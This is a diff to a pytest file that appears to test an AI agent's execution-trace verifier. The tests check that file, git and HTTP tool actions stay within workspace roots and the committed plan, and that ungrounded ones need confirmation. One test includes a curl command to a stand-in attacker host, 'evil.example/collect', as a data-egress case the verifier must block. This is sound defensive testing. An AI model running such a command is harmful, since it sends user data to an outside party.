@@ -6,6 +6,7 @@ import asyncio
 import hashlib
 import json
 from datetime import UTC, datetime, timedelta
+from pathlib import Path
 
 import pytest
 
@@ -454,6 +455,7 @@ def test_m5_t7_plan_commit_hash_is_deterministic_and_correct() -> None:
         allowed_actions={ActionKind.FS_READ, ActionKind.FS_LIST},
         allowed_resources={"/tmp/*"},
         goal_resource_patterns=set(),
+        declared_resource_roots=set(),
         forbidden_actions={ActionKind.SHELL_EXEC},
         max_actions=7,
         committed_at=committed_at,
@@ -466,6 +468,7 @@ def test_m5_t7_plan_commit_hash_is_deterministic_and_correct() -> None:
         allowed_actions={ActionKind.FS_READ, ActionKind.FS_LIST},
         allowed_resources={"/tmp/*"},
         goal_resource_patterns=set(),
+        declared_resource_roots=set(),
         forbidden_actions={ActionKind.SHELL_EXEC},
         max_actions=7,
         committed_at=committed_at,
@@ -478,6 +481,7 @@ def test_m5_t7_plan_commit_hash_is_deterministic_and_correct() -> None:
         "allowed_actions": ["FS_LIST", "FS_READ"],
         "allowed_resources": ["/tmp/*"],
         "goal_resource_patterns": [],
+        "declared_resource_roots": [],
         "forbidden_actions": ["SHELL_EXEC"],
         "max_actions": 7,
         "committed_at": committed_at.isoformat(),
@@ -532,6 +536,7 @@ def test_m5_t9_trace_rejects_forbidden_action() -> None:
         allowed_actions={ActionKind.SHELL_EXEC},
         allowed_resources=set(),
         goal_resource_patterns=set(),
+        declared_resource_roots=set(),
         forbidden_actions={ActionKind.SHELL_EXEC},
         max_actions=5,
         committed_at=committed_at,
@@ -758,18 +763,45 @@ def test_m5_rt9_command_filename_token_is_not_misclassified_as_egress() -> None:
     assert kind != ActionKind.EGRESS
 
 
-def test_m5_rt10_trace_allows_fs_list_without_path_arguments() -> None:
-    verifier = ExecutionTraceVerifier()
+def test_m5_rt10_trace_allows_fs_list_without_path_arguments_when_goal_points_at_workspace(
+    tmp_path: Path,
+) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
     origin = _origin("s-rt10")
     verifier.begin_precontent_plan(
         session_id=origin.session_id,
-        goal="list files",
+        goal="list the files in the folder you're in",
         origin=origin,
     )
-    action = build_action(tool_name="fs.list", arguments={}, origin=origin)
+    action = build_action(
+        tool_name="fs.list",
+        arguments={},
+        origin=origin,
+        workspace_roots=[tmp_path],
+    )
     result = verifier.verify_action(session_id=origin.session_id, action=action)
     assert result.allowed is True
     assert result.reason_code == "trace:allowed"
+
+
+def test_h4_trace_workspace_hint_does_not_preapprove_child_reads(tmp_path: Path) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
+    origin = _origin("s-h4-workspace-hint")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="list the files in the folder you're in",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+    )
+    action = build_action(
+        tool_name="fs.read",
+        arguments={"path": "README.md"},
+        origin=origin,
+        workspace_roots=[tmp_path],
+    )
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is False
+    assert result.reason_code == "trace:tdg_confirmation_required"
 
 
 def test_h4_trace_allows_goal_rooted_fs_read_path() -> None:
@@ -789,6 +821,50 @@ def test_h4_trace_allows_goal_rooted_fs_read_path() -> None:
     result = verifier.verify_action(session_id=origin.session_id, action=action)
     assert result.allowed is True
     assert result.reason_code == "trace:allowed"
+
+
+def test_h4_trace_allows_clean_command_declared_roots_for_vague_goal(tmp_path: Path) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
+    origin = _origin("s-h4-declared-root")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="fix the typo",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+        declared_resource_roots={"README.md"},
+    )
+    action = build_action(
+        tool_name="fs.read",
+        arguments={"path": "README.md"},
+        origin=origin,
+        workspace_roots=[tmp_path],
+    )
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is True
+    assert result.reason_code == "trace:allowed"
+    plan = verifier.active_plan(origin.session_id)
+    assert plan is not None
+    assert plan.declared_resource_roots == {str((tmp_path / "README.md").resolve(strict=False))}
+
+
+def test_h4_trace_plan_hash_binds_declared_resource_roots(tmp_path: Path) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
+    origin = _origin("s-h4-root-hash")
+    first = verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="fix the typo",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+        declared_resource_roots={"README.md"},
+    )
+    second = verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="fix the typo",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+        declared_resource_roots={"CHANGELOG.md"},
+    )
+    assert first.plan_hash != second.plan_hash
 
 
 def test_h4_trace_allows_goal_rooted_fs_read_for_bare_readme_request() -> None:
@@ -827,6 +903,47 @@ def test_h4_trace_missing_path_read_requires_confirmation() -> None:
     result = verifier.verify_action(session_id=origin.session_id, action=action)
     assert result.allowed is False
     assert result.reason_code == "trace:tdg_confirmation_required"
+
+
+def test_h4_trace_default_fs_list_without_goal_path_requires_confirmation(tmp_path: Path) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
+    origin = _origin("s-h4-list-confirm")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="say hello",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+    )
+    action = build_action(
+        tool_name="fs.list",
+        arguments={},
+        origin=origin,
+        workspace_roots=[tmp_path],
+    )
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is False
+    assert result.reason_code == "trace:tdg_confirmation_required"
+
+
+def test_h4_trace_default_git_status_is_workspace_rooted(tmp_path: Path) -> None:
+    verifier = ExecutionTraceVerifier(workspace_roots=[tmp_path])
+    origin = _origin("s-h4-git-status")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="show me the git status",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+    )
+    action = build_action(
+        tool_name="git.status",
+        arguments={},
+        origin=origin,
+        workspace_roots=[tmp_path],
+    )
+    assert action.resource_ids == [str(tmp_path.resolve(strict=False))]
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is True
+    assert result.reason_code == "trace:allowed"
 
 
 def test_h4_trace_missing_path_side_effect_blocks() -> None:
@@ -876,6 +993,53 @@ def test_h4_trace_stage2_approved_side_effect_allows_fresh_dependency_path() -> 
     allowed = verifier.verify_action(session_id=origin.session_id, action=action)
     assert allowed.allowed is True
     assert allowed.reason_code == "trace:allowed"
+
+
+def test_h4_trace_blocks_multi_host_egress_when_any_sink_is_ungrounded() -> None:
+    verifier = ExecutionTraceVerifier()
+    origin = _origin("s-h4-multi-host")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="fetch https://example.com",
+        origin=origin,
+        capabilities={Capability.HTTP_REQUEST},
+    )
+    action = build_action(
+        tool_name="http.request",
+        arguments={
+            "command": ["curl", "https://evil.example/collect"],
+            "network_urls": ["https://example.com"],
+        },
+        origin=origin,
+        risk_tier=RiskTier.HIGH,
+    )
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is False
+    assert result.reason_code == "trace:tdg_dependency_path_missing"
+
+
+def test_h4_trace_bare_filename_fallback_stays_directory_scoped(tmp_path: Path) -> None:
+    workspace_root = tmp_path / "workspace"
+    workspace_root.mkdir()
+    other_root = tmp_path / "other"
+    other_root.mkdir()
+    verifier = ExecutionTraceVerifier(workspace_roots=[workspace_root])
+    origin = _origin("s-h4-readme-scope")
+    verifier.begin_precontent_plan(
+        session_id=origin.session_id,
+        goal="read the README",
+        origin=origin,
+        capabilities={Capability.FILE_READ},
+    )
+    action = build_action(
+        tool_name="fs.read",
+        arguments={"path": str(other_root / "README.md")},
+        origin=origin,
+        workspace_roots=[workspace_root],
+    )
+    result = verifier.verify_action(session_id=origin.session_id, action=action)
+    assert result.allowed is False
+    assert result.reason_code == "trace:tdg_confirmation_required"
 
 
 def test_m6_trace_requires_stage2_for_browser_write_actions() -> None:
